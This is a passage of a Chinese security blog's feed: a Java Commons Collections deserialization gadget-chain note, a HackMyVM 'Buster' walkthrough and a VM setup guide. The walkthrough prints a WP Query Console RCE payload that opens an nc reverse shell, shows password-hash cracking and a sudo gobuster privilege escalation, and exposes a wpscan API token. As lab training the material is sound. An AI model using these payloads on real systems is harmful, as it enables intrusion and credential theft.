<span class="hljs-keyword">public</span> java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) <span class="hljs-keyword">throws</span> java.lang.NoSuchMethodException,java.lang.SecurityException<br>invoke <span class="hljs-keyword">return</span>: <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.Runtime java.lang.Runtime.getRuntime()<br>cls_2: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.reflect.Method<br>method_2: <span class="hljs-keyword">public</span> java.lang.Object java.lang.reflect.Method.invoke(java.lang.Object,java.lang.Object[]) <span class="hljs-keyword">throws</span> java.lang.IllegalAccessException,java.lang.IllegalArgumentException,java.lang.reflect.InvocationTargetException<br>invoke return_2: java.lang.Runtime@28d93b30<br>cls_3: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Runtime<br>method_3: <span class="hljs-keyword">public</span> java.lang.Process java.lang.Runtime.exec(java.lang.String) <span class="hljs-keyword">throws</span> java.io.IOException<br>invoke return_3: java.lang.UNIXProcess@7b23ec81<br>get all done<br></code></pre></td></tr></table></figure><p>据此我们可以列出三次反射的最后命令调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">1: java.lang.Class.getMethod::invoke(Runtime.class, &quot;getRuntime&quot;)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.Runtime.getRuntime()</span><br>2: java.lang.reflect.invoke::invoke(java.lang.Runtime.getRuntime(), null)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.Runtime@28d93b30</span><br>3: java.lang.Runtime.exec::invoke(java.lang.Runtime@28d93b30, &quot;touch aaa&quot;)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.UNIXProcess@7b23ec81</span><br></code></pre></td></tr></table></figure><p>第一步 等价于 Runtime.class.getMethod(“getRuntime”) 并返回一个 java.lang.Runtime.getRuntime()的Method<br>第二步 等价于 getRuntimeMethod.invoke(null, null) 并返回一个Runtime的实例<br>第三步 等价于 Runtime实例.exec(“touch aaa”) 并返回一个UNIX进程</p><p>到此我们Runtime命令执行的反序列化完成 接下来就是把它们连续调用transform给串起来</p><p>这里ChainedTransformer是必须的 有点巧妙的感觉 就像是正好CC库里有这样一个非常容易成为攻击的点一样</p><p>LazyMap的打法我怎么没弄懂呢 感觉还是得看一下cc6才能懂 先贴一下gadget chain</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">/*<br>Gadget chain:<br>ObjectInputStream.readObject()<br>AnnotationInvocationHandler.readObject()<br>Map(Proxy).entrySet()<br>AnnotationInvocationHandler.invoke()<br>LazyMap.get()<br>ChainedTransformer.transform()<br>ConstantTransformer.transform()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Class.getMethod()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.getRuntime()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.exec()<br>*/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信呼OA打点</title>
    <link href="/2025/04/02/%E4%BF%A1%E5%91%BCOA%E6%89%93%E7%82%B9/"/>
    <url>/2025/04/02/%E4%BF%A1%E5%91%BCOA%E6%89%93%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5270e1b60c68186f7d9f3a7fd17aeea15ec3e4f0e851e52f15f3e8cc856676fc"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>Real_world</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lookthrough for HackMyVM_Buster</title>
    <link href="/2025/02/18/HackMyVM_Buster/"/>
    <url>/2025/02/18/HackMyVM_Buster/</url>
    
    <content type="html"><![CDATA[<h1 id="HackMyVM-Buster"><a href="#HackMyVM-Buster" class="headerlink" title="HackMyVM_Buster"></a>HackMyVM_Buster</h1><p>这台机子的网卡又有问题<br>配好后，nmap扫一下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[/usr/share/wordlists/metasploit]<br>└─<span class="hljs-comment"># nmap 192.168.64.6</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.64</span><span class="hljs-number">.6</span><br>Host is up (<span class="hljs-number">0.00068</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span><br>MAC Address: CE:<span class="hljs-number">5</span>E:DA:EA:E4:<span class="hljs-number">33</span> (Unknown)<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">13.27</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>上80看了下 是wordpress<br>wpscan扫一下 这里学到了 用免费的wpscan官网的api-token可以扫一下数据库</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali)-[<span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>wordlists<span class="hljs-operator">/</span>metasploit]<br>└─<span class="hljs-comment"># wpscan --url http://192.168.64.6/ -e vp,u --api-token wfO2qNYqlam4QGql4RFJXIXG0oohePz5k7kSpRbXxfI</span><br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        <span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span>  __ \ <span class="hljs-symbol">/</span> ____|<br>          \ \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span> <span class="hljs-operator">/</span>| |__) | (___   ___  __ _ _ __ ®<br>           \ \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span> <span class="hljs-symbol">/</span> |  ___<span class="hljs-symbol">/</span> \___ \ <span class="hljs-symbol">/</span> __|<span class="hljs-symbol">/</span> _` | &#x27;_ \<br>            \  <span class="hljs-operator">/</span>\  <span class="hljs-symbol">/</span>  | |     ____) | (__| (_| | | | |<br>             \<span class="hljs-symbol">/</span>  \<span class="hljs-symbol">/</span>   |_|    |_____<span class="hljs-symbol">/</span> \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">27</span><br>       Sponsored by Automattic <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>automattic.com<span class="hljs-symbol">/</span><br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">URL:</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-symbol">/</span> [<span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span>]<br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Started:</span> Tue Feb <span class="hljs-number">18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span>:<span class="hljs-number">10</span> <span class="hljs-number">2025</span><br><br>Interesting Finding(s):<br><br>[<span class="hljs-operator">+</span>] Headers<br> | Interesting <span class="hljs-params">Entry:</span> <span class="hljs-params">Server:</span> nginx<span class="hljs-symbol">/1.14.2</span><br> | Found <span class="hljs-params">By:</span> Headers (Passive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] robots.txt <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//192.168.64.6/robots.txt</span><br> | Interesting <span class="hljs-params">Entries:</span><br> |  <span class="hljs-operator">-</span> <span class="hljs-operator">/</span>wp-admin<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> <span class="hljs-symbol">/wp-admin/admin-ajax.php</span><br> | Found <span class="hljs-params">By:</span> Robots Txt (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] XML-RPC seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//192.168.64.6/xmlrpc.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_ghost_scanner<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>dos<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_dos<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_xmlrpc_login<span class="hljs-symbol">/</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>db<span class="hljs-operator">/</span>modules<span class="hljs-operator">/</span>auxiliary<span class="hljs-operator">/</span>scanner<span class="hljs-operator">/</span>http<span class="hljs-operator">/</span>wordpress_pingback_access<span class="hljs-symbol">/</span><br><br>[<span class="hljs-operator">+</span>] WordPress readme <span class="hljs-params">found:</span> http:<span class="hljs-symbol">//192.168.64.6/readme.html</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">100</span>%<br><br>[<span class="hljs-operator">+</span>] The external WP-Cron seems to be <span class="hljs-params">enabled:</span> http:<span class="hljs-symbol">//192.168.64.6/wp-cron.php</span><br> | Found <span class="hljs-params">By:</span> Direct Access (Aggressive Detection)<br> | <span class="hljs-params">Confidence:</span> <span class="hljs-number">60</span>%<br> | <span class="hljs-params">References:</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[<span class="hljs-operator">+</span>] WordPress version <span class="hljs-number">6.7</span>.<span class="hljs-number">1</span> identified (Outdated, released on <span class="hljs-number">202</span>4-<span class="hljs-number">1</span>1-<span class="hljs-number">21</span>).<br> | Found <span class="hljs-params">By:</span> Meta Generator (Passive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>, <span class="hljs-params">Match:</span> &#x27;WordPress <span class="hljs-number">6.7</span>.<span class="hljs-number">1</span>&#x27;<br> | Confirmed <span class="hljs-params">By:</span> Rss Generator (Aggressive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.7</span>.<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>comments<span class="hljs-operator">/</span>feed<span class="hljs-operator">/</span>, <span class="hljs-symbol">&lt;generator&gt;</span>https:<span class="hljs-operator">//</span>wordpress.org<span class="hljs-operator">/</span><span class="hljs-operator">?</span>v<span class="hljs-operator">=</span><span class="hljs-number">6.7</span>.<span class="hljs-number">1</span><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>generator<span class="hljs-operator">&gt;</span><br><br>[i] The main theme could not be detected.<br><br>[<span class="hljs-operator">+</span>] Enumerating Vulnerable Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[<span class="hljs-operator">+</span>] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs <span class="hljs-operator">-</span> <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-operator">&lt;=</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">==</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> (<span class="hljs-number">10</span> <span class="hljs-symbol">/</span> <span class="hljs-number">10</span>) <span class="hljs-number">100.00</span>% <span class="hljs-params">Time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><br>[i] User(s) <span class="hljs-params">Identified:</span><br><br>[<span class="hljs-operator">+</span>] ta0<br> | Found <span class="hljs-params">By:</span> Wp Json Api (Aggressive Detection)<br> |  <span class="hljs-operator">-</span> http:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.6</span><span class="hljs-operator">/</span>wp-json<span class="hljs-operator">/</span>wp<span class="hljs-operator">/</span>v2<span class="hljs-operator">/</span>users<span class="hljs-operator">/</span><span class="hljs-operator">?</span>per_page<span class="hljs-operator">=</span><span class="hljs-number">100</span>&amp;page<span class="hljs-operator">=</span><span class="hljs-number">1</span><br> | Confirmed <span class="hljs-params">By:</span><br> |  Rss Generator (Aggressive Detection)<br> |  Author Id Brute Forcing <span class="hljs-operator">-</span> Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)<br><br>[<span class="hljs-operator">+</span>] welcome<br> | Found <span class="hljs-params">By:</span> Author Id Brute Forcing <span class="hljs-operator">-</span> Author Pattern (Aggressive Detection)<br> | Confirmed <span class="hljs-params">By:</span> Login Error Messages (Aggressive Detection)<br><br>[<span class="hljs-operator">+</span>] WPScan DB API OK<br> | <span class="hljs-params">Plan:</span> free<br> | Requests Done (during the scan): <span class="hljs-number">1</span><br> | Requests <span class="hljs-params">Remaining:</span> <span class="hljs-number">24</span><br><br>[<span class="hljs-operator">+</span>] <span class="hljs-params">Finished:</span> Tue Feb <span class="hljs-number">18</span> <span class="hljs-number">01</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span> <span class="hljs-number">2025</span><br>[<span class="hljs-operator">+</span>] Requests <span class="hljs-params">Done:</span> <span class="hljs-number">17</span><br>[<span class="hljs-operator">+</span>] Cached <span class="hljs-params">Requests:</span> <span class="hljs-number">42</span><br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Sent:</span> <span class="hljs-number">4.404</span> KB<br>[<span class="hljs-operator">+</span>] Data <span class="hljs-params">Received:</span> <span class="hljs-number">56.764</span> KB<br>[<span class="hljs-operator">+</span>] Memory <span class="hljs-params">used:</span> <span class="hljs-number">216.934</span> MB<br>[<span class="hljs-operator">+</span>] Elapsed <span class="hljs-params">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span><br></code></pre></td></tr></table></figure><p>有用户凭据ta0和welcome 但是爆破好像都不太行<br>又学到了 wpscan扫插件得更细一点<br><code>wpscan --url http://192.168.64.6/ -e ap --plugins-detection --api-token wfO2qNYqlam4QGql4RFJXIXG0oohePz5k7kSpRbXxfI</code><br>扫的疑似有点慢了 下次真得把kali内存和处理器数调上去了</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">[!] <span class="hljs-number">1</span> vulnerability identified:<br> |<br> | [!] Title: WP Query Console &lt;= <span class="hljs-number">1.0</span> - Unauthenticated Remote Code Execution<br> |     References:<br> |      - https://wpscan.com/vulnerability/f911568d-5f79-<span class="hljs-number">49b7</span>-8ce4-fa0da3183214<br> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-<span class="hljs-number">2024</span>-<span class="hljs-number">50498</span><br> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3<br> |<br></code></pre></td></tr></table></figure><p>结果是有wp query的洞<br><a href="https://github.com/RandomRobbieBF/CVE-2024-50498">见这里利用（github）</a></p><p>可以执行任意php命令 就是ban了一些系统函数 但是没完全ban<br><code>&#123;&quot;queryArgs&quot;:&quot;shell_exec(&#39;nc -e /bin/bash 192.168.64.2 1234&#39;);&quot;,&quot;queryType&quot;:&quot;post&quot;&#125;</code><br>直接把shell弹回来 顺便升级一下shell</p><p>读wp-config.php 拿到mysql凭据<code>ll104567:thehandsomeguy</code><br><code>mysql -u ll104567 -p</code>登上去</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use wordpress;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> wp_users;<br></code></pre></td></tr></table></figure><p>拿到ta0和welcome的密码hash 用john跑rockyou<br><code>ta0:$P$BDDc71nM67DbOVN/U50WFGII6EF6.r.</code><br><code>welcome:$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(root㉿kali)-[/tmp]<br>└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash<br>Created directory: /root/.john<br><span class="hljs-keyword">Using</span> default input encoding: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> password hash (phpass [phpass (<span class="hljs-symbol">$</span>P<span class="hljs-symbol">$</span> <span class="hljs-keyword">or</span> <span class="hljs-symbol">$</span>H<span class="hljs-symbol">$</span>) <span class="hljs-number">128</span>/<span class="hljs-number">128</span> ASIMD <span class="hljs-number">4</span>x2])<br>Cost <span class="hljs-number">1</span> (iteration count) is <span class="hljs-number">8192</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C to <span class="hljs-keyword">abort</span>, almost any other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">104567</span>           (?)<br><span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">36</span> DONE (<span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-18</span> <span class="hljs-number">02</span>:<span class="hljs-number">21</span>) <span class="hljs-number">0.02724</span>g/s <span class="hljs-number">20200</span>p/s <span class="hljs-number">20200</span>c/s <span class="hljs-number">20200</span>C/s <span class="hljs-number">112233669.</span><span class="hljs-number">.085356</span><br>Use the <span class="hljs-string">&quot;--show --format=phpass&quot;</span> <span class="hljs-keyword">options</span> to <span class="hljs-keyword">display</span> <span class="hljs-keyword">all</span> of the cracked passwords reliably<br>Session completed.<br></code></pre></td></tr></table></figure><p>跑出welcome的密码是104567 ta0的跑不出来<br>ssh登上welcome就能拿到user flag</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">welcome<span class="hljs-variable">@listen</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> welcome on <span class="hljs-symbol">listen:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> welcome may run the following commands on <span class="hljs-symbol">listen:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/gobuster<br></code></pre></td></tr></table></figure><p>sudo -l发现可以运行gobuster<br>这里又学到了（<br>先拉个pspy64下来看看定时任务<br><code>2025/02/18 02:50:01 CMD: UID=0     PID=1304   | /bin/sh -c /bin/bash /opt/.test.sh</code><br>有一个&#x2F;opt&#x2F;.test.sh 联想到gobuster -o可以写入文件 所以把这个.test.sh覆写了就行</p><p>覆写流程<br>首先攻击机必须得有对应的路径 比如我在~下启动python服务器 那么想要有输出（比如说&#x2F;tmp&#x2F;b）写入&#x2F;opt&#x2F;.test.sh 则必须<code>mkdir tmp;cd /tmp;touch b</code> 即有这个路径能给gobuster访问 同时<code>echo &#39;tmp/b&#39; &gt; a.txt</code>这是宿主机的操作 因为gobuster会在最前面补上一个&#x2F;<br><code>sudo gobuster -w a.txt -u http://192.168.64.2:8000/ -n -q -o /opt/.test.sh</code><br>ls看到&#x2F;opt&#x2F;.test.sh的大小确实发生了变化</p><p>但是不知道什么情况 覆写了之后shell就是弹不回来？？？</p>]]></content>
    
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>lookthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86 for Macbook ARM64(especially penetration)</title>
    <link href="/2025/02/13/MAC%20x86%20for%20arm/"/>
    <url>/2025/02/13/MAC%20x86%20for%20arm/</url>
    
    <content type="html"><![CDATA[<h1 id="MAC-x86-for-arm"><a href="#MAC-x86-for-arm" class="headerlink" title="MAC x86 for arm"></a>MAC x86 for arm</h1><p>拿到ova文件后</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">&gt; tar xvf xxx<span class="hljs-selector-class">.ova</span><br><span class="hljs-attribute">x</span> xxx<span class="hljs-selector-class">.ovf</span><br><span class="hljs-attribute">x</span> xxx-disk001<span class="hljs-selector-class">.vmdk</span><br><span class="hljs-attribute">x</span> xxx<span class="hljs-selector-class">.mf</span><br></code></pre></td></tr></table></figure><p>然后用qemu-img把.vmdk转成.qcow2格式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">qemu-<span class="hljs-selector-tag">img</span> convert -<span class="hljs-selector-tag">p</span> -O qcow2 xxx-disk001<span class="hljs-selector-class">.vmdk</span> xxx.qcow2<br></code></pre></td></tr></table></figure><p>新建虚拟机 内存768MB<br>UTM设置里取消UEFI<br>删除默认IDE驱动器 导入xxx.qcow2</p><h2 id="如果靶机拿不到ip"><a href="#如果靶机拿不到ip" class="headerlink" title="如果靶机拿不到ip"></a>如果靶机拿不到ip</h2><p>应该是网卡配置有问题<br>对于debian系的linux系统，按e进入编辑模式<br>修改ro为rw single init&#x3D;&#x2F;bin&#x2F;bash<br>重新启动后就可以匿名管理员登陆<br>用<code>ip addr</code>查看网卡信息，utm一般是enp0s1<br>如果是Ubuntu &lt; 20.04版本，则通过<code>vi /etc/network/interfaces</code>修改该靶场的网卡名enp0s3为上面的enp0s1<br>如果Ubuntu &gt;&#x3D; 20.04，则<code>vi /etc/netplan/xxxx.yaml</code>进行修改<br>如果是CentOS，则在<code>vi /etc/sysconfig/network-scripts/ifcfg-xxx</code>中进行类似修改</p><p>参考:<br><code>https://guayu-kakeru.github.io/posts/86.html#more</code><br><code>https://xzajyjs.cn/2024/02/26/vulnhub_interfaces/</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>environ-settings</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF Practice</title>
    <link href="/2024/03/01/BUUOJ%E5%88%B7%E9%A2%98/"/>
    <url>/2024/03/01/BUUOJ%E5%88%B7%E9%A2%98/</url>
    
